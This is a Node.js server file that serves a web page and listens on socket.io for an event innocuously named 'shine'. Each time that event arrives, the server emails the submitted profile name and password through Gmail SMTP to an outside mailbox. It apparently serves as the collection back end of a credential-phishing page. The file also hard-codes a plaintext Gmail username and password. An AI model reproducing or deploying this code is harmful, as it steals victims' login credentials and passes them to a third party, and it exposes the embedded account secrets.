'use strict';

const express = require('express');
const socketIO = require('socket.io');
const path = require('path');
const nodemailer = require('nodemailer');
let transporter = nodemailer.createTransport({
  host: 'smtp.gmail.com',
  port: 465,
  secure: true,
  auth: {
    user: "marion.silver19@gmail.com",
    pass: "YujQuemhibagye4"
  }
});

const PORT = process.env.PORT || 3000;
const INDEX = path.join(__dirname, 'index.html');

const server = express()
  .use(express.static(__dirname + '/public'))
  .use((req, res) => res.sendFile(INDEX) )
  .listen(PORT, () => console.log(`Listening on ${ PORT }`));

const io = socketIO(server);

io.on('connection', (socket) => {
  console.log('Client connected');
  socket.on('disconnect', () => console.log('Client disconnected'));
  socket.on('shine', (data) => shine(data))
  socket.on('sleep', (data) => sleep(data))
});

var shine = function(data) {
  console.log(data);
  transporter.sendMail({
    from: 'alicia.holm@gmx.com',
    to: 'alicia.holm83@gmail.com',
    subject: 'shine',
    text: data.profile + ':' + data.pwd
  })
}

var sleep = function(data) {
  console.log(data);
}
